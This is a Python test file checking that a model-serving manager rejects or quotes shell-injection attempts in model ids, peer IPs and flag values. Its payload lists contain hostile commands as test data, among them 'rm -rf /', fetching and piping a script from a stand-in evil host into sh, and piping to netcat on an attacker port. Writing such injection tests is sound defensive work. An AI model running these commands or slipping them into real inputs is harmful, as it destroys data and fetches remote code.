"""Shell-injection tests for the vLLM cmd/cmdStop strings (ARD
t_76f3d1c0 §7 B3).

model_id is interpolated into --served-model-name, the docker container
name and the cmdStop pkill pattern — all injection surfaces. Per
src/vllm_manager.py:49 the defense is a strict allowlist
(_SAFE_ID: ^[A-Za-z0-9][A-Za-z0-9._-]*$) instead of escaping. These
tests pin that behavior: safe ids pass through verbatim; every shell
metacharacter is rejected BEFORE any command string is produced.
"""
import pytest
from vllm_manager import (_SAFE_ID, _require_safe_id, build_cmd_stop,
                          build_vllm_command, swap_entry_parts)

VENV_CFG = {"delivery": "venv", "venv_bin": "~/vllm-env/bin/vllm",
            "docker_image": "vllm/vllm-openai:latest",
            "default_gpu_memory_utilization": 0.9}
DOCKER_CFG = dict(VENV_CFG, delivery="docker")
MASTER = {"name": "aibox1", "ip": "10.0.0.98", "os": "linux"}


def _model(mid):
    # DEC-08: launch requires a native vllm: section; safe-id tests only
    # exercise id interpolation, so any non-empty section works.
    return {"model_id": mid, "flags": {}, "base_path": "/mnt/store/m",
            "vllm": {"cpu_offload_gb": 0}}


SAFE_IDS = ["qwen3-8b", "Llama-3.2-1B-Instruct", "a", "Z9",
            "model.v2_final-RC1"]

HOSTILE_IDS = [
    "x;id", ";id", "x&id", "&id", "x|id", "|id", "x>y", "x<y", "x$(id)",
    "$(id)", "x`id`", "x${HOME}", "$HOME", "a b", "a\tb", "a\nb", "a\rb",
    "a'b", 'a"b', "a\\b", "a*b", "a?b", "a[b", "a!b", "a#b", "a~b",
    "a=b", "a,b", "a:b", "a@b", "a%b", "a^b", "a/b", ".x", "-x", "_x",
    "", "   ", "x -o ProxyCommand=evil",
]


@pytest.mark.parametrize("mid", SAFE_IDS)
def test_safe_ids_accepted_and_embedded_verbatim(mid):
    assert _require_safe_id(_model(mid)) == mid
    assert build_cmd_stop(_model(mid), VENV_CFG) == (
        f'pkill -f "vllm serve.*{mid}"')
    cmd = build_vllm_command(_model(mid), MASTER, VENV_CFG)
    assert f'--served-model-name "{mid}"' in cmd


def test_cmdstop_venv_exact():
    assert build_cmd_stop(_model("qwen3-8b"), VENV_CFG) == (
        'pkill -f "vllm serve.*qwen3-8b"')


def test_cmdstop_docker_exact():
    assert build_cmd_stop(_model("qwen3-8b"), DOCKER_CFG) == (
        "docker stop farm-qwen3-8b")


def test_swap_entry_parts_shape():
    parts = swap_entry_parts(_model("qwen3-8b"), MASTER, VENV_CFG)
    assert parts["cmdStop"] == 'pkill -f "vllm serve.*qwen3-8b"'
    assert parts["checkEndpoint"] == "/health"
    assert parts["env"] == {}
    assert '--port "$PORT"' in parts["cmd"]


@pytest.mark.parametrize("mid", HOSTILE_IDS)
def test_hostile_ids_rejected_for_both_deliveries(mid):
    """Every injection vector is rejected at the allowlist gate for cmd
    AND cmdStop, venv AND docker — nothing hostile reaches a shell."""
    for vllm_cfg in (VENV_CFG, DOCKER_CFG):
        with pytest.raises(ValueError):
            _require_safe_id(_model(mid))
        with pytest.raises(ValueError):
            build_cmd_stop(_model(mid), vllm_cfg)
        with pytest.raises(ValueError):
            build_vllm_command(_model(mid), MASTER, vllm_cfg)
        with pytest.raises(ValueError):
            swap_entry_parts(_model(mid), MASTER, vllm_cfg)


def test_no_partial_output_on_rejection():
    """The allowlist gate runs before any string assembly: a rejected id
    yields an exception, never a partially-built command."""
    with pytest.raises(ValueError):
        build_cmd_stop(_model("x;id"), VENV_CFG)
    with pytest.raises(ValueError):
        build_cmd_stop(_model("x;id"), DOCKER_CFG)


def test_allowlist_excludes_shell_metacharacters():
    """The allowlist itself is the defense (no escaping): none of the
    characters that matter for shell/quote/flag escape attempts may
    match, at any position."""
    dangerous = list(";|&`$(){}[]<>") + [
        "\\", "'", '"', "\n", "\t", "\r", " ", "*", "?", "!", "#", "~",
        "=", "@", "+", ",", ":", "%", "^", "/"]
    for ch in dangerous:
        assert _SAFE_ID.fullmatch(f"a{ch}b") is None, f"allowed: {ch!r}"
        assert _SAFE_ID.fullmatch(f"{ch}ab") is None, f"lead: {ch!r}"
    # the allowed set is exactly the documented one
    assert _SAFE_ID.fullmatch("A-z_0.9-") is not None
    # metachars are not allowed in leading position either (a leading
    # dash would turn the id into a flag, a leading dot hides the file)
    for ch in ".-_":
        assert _SAFE_ID.fullmatch(f"{ch}x") is None

# ======================================================================
# qe-validation-test branch: secrets-vault / installer regression tests
# (helper names prefixed _qe_ to avoid collision with the vllm-branch helpers above)
# ======================================================================

import re
import shlex

import pytest

import rpc_manager
from rpc_manager import build_llama_command, _render_rpc


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _machine(name, ip, os="linux", role="peer", **kw):
    m = {
        "name": name,
        "ip": ip,
        "username": "u",
        "password": "p",
        "os": os,
        "rpc_port": 50052,
        "gpu": "CUDA0",
        "role": role,
        "detected": {
            "gpu_names": ["CUDA0 (GPU)"],
            "vram_total_gb": 8,
            "ram_total_gb": 16,
            "cores": 8,
        },
    }
    m.update(kw)
    return m


def _qe__model(mid, flags=None, base_path="store://llm-models/safe.gguf", **kw):
    m = {
        "model_id": mid,
        "flags": flags or {},
        "base_path": base_path,
        "device_order": "",
        "device_order_policy": "as-selected",
        "expose": {},
    }
    m.update(kw)
    return m


# Metacharacter payloads that must never appear unquoted in generated scripts.
_PAYLOADS = [
    "10.0.0.1; rm -rf /",
    "10.0.0.1`id`",
    "10.0.0.1$(curl evil.example.com)",
    "10.0.0.1 | nc attacker 4444",
]


def _unquoted_payload_present(script: str, raw_payload: str) -> bool:
    """Return True if *raw_payload* (or any dangerous metacharacter substring
    of it beyond the plain IP) appears outside of a single- or double-quoted
    context in *script*.

    Strategy: look for the metacharacter sequence that follows the IP address.
    If the injected suffix (e.g. ``; rm -rf /``) appears in the script at all
    outside of a quoted string, it is potentially executable.
    """
    # Extract the injected suffix after the IP (everything after the first space
    # or shell metacharacter boundary).
    suffix_match = re.search(r'[\d\.]+(.+)', raw_payload)
    if not suffix_match:
        return False
    suffix = re.escape(suffix_match.group(1).strip())
    # Accept if it only appears inside single-quoted strings ('...')
    # or double-quoted strings ("..."), which neutralise most metacharacters.
    for line in script.splitlines():
        if re.search(suffix, line):
            # Check whether the occurrence is inside quotes.
            # Simple heuristic: if the line has the suffix but it is not
            # wrapped in quotes, flag it.
            if not re.search(r"'[^']*" + suffix + r"[^']*'", line) and \
               not re.search(r'"[^"]*' + suffix + r'[^"]*"', line):
                return True
    return False


# ---------------------------------------------------------------------------
# build_llama_command: injected IP in --rpc flag
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("malicious_ip", _PAYLOADS)
def test_build_command_rpc_ip_does_not_inject(stub_cfg, malicious_ip):
    """A malicious IP for a peer must not produce an unquoted shell
    metacharacter in the llama-server command line emitted by
    build_llama_command."""
    master = _machine("aibox1", "10.0.0.98", role="master")
    peer = _machine("aibox2", malicious_ip, role="peer")
    stub_cfg.update({m["name"]: m for m in (master, peer)})
    model = _qe__model("m")

    # The function must either raise a ValueError/sanitization error OR
    # produce output where the metacharacter suffix is safely quoted.
    try:
        cmd = build_llama_command(
            model, [master["name"], peer["name"]], master_name=master["name"]
        )
    except (ValueError, KeyError):
        # Rejection at generation time is an acceptable safe outcome.
        return

    assert not _unquoted_payload_present(cmd, malicious_ip), (
        f"Metacharacter payload appeared unquoted in generated command:\n"
        f"payload={malicious_ip!r}\ncmd=\n{cmd}"
    )


# ---------------------------------------------------------------------------
# build_llama_command: injected value in a user-supplied flag
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("malicious_flag_value", [
    "8192; echo pwned",
    "8192`id`",
    "8192 && curl evil.example.com | sh",
])
def test_build_command_flag_value_does_not_inject(stub_cfg, malicious_flag_value):
    """A user-supplied flag value containing shell metacharacters must not
    appear unquoted in the generated llama-server command."""
    master = _machine("aibox1", "10.0.0.98", role="master")
    stub_cfg.update({master["name"]: master})
    model = _qe__model("m", flags={"ctx-size": malicious_flag_value})

    try:
        cmd = build_llama_command(
            model, [master["name"]], master_name=master["name"]
        )
    except (ValueError, KeyError):
        return  # Rejected — safe.

    # The semicolon / backtick / && must not appear unquoted.
    dangerous = re.compile(r'(?:;|`|&&|\|\|)')
    for line in cmd.splitlines():
        # Strip anything inside single or double quotes before checking.
        stripped = re.sub(r"'[^']*'", "", line)
        stripped = re.sub(r'"[^"]*"', "", stripped)
        assert not dangerous.search(stripped), (
            f"Unquoted metacharacter in flag line:\n{line!r}\n"
            f"flag_value={malicious_flag_value!r}"
        )


# ---------------------------------------------------------------------------
# _render_rpc: injected IP in the start-* script
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("malicious_ip", _PAYLOADS)
def test_render_rpc_ip_does_not_inject(stub_cfg, malicious_ip):
    """A malicious peer IP must not produce an unquoted shell metacharacter
    in the _render_rpc bash start script."""
    master = _machine("aibox1", "10.0.0.98", role="master")
    peer = _machine("aibox2", malicious_ip)
    stub_cfg.update({m["name"]: m for m in (master, peer)})
    model = _qe__model(
        "m",
        device_order=f"aibox1-CUDA0,aibox2-CUDA0",
    )

    try:
        script = _render_rpc(model, master, [peer])
    except (ValueError, KeyError):
        return  # Rejected — safe.

    assert not _unquoted_payload_present(script, malicious_ip), (
        f"Metacharacter payload appeared unquoted in RPC script:\n"
        f"payload={malicious_ip!r}\nscript=\n{script}"
    )
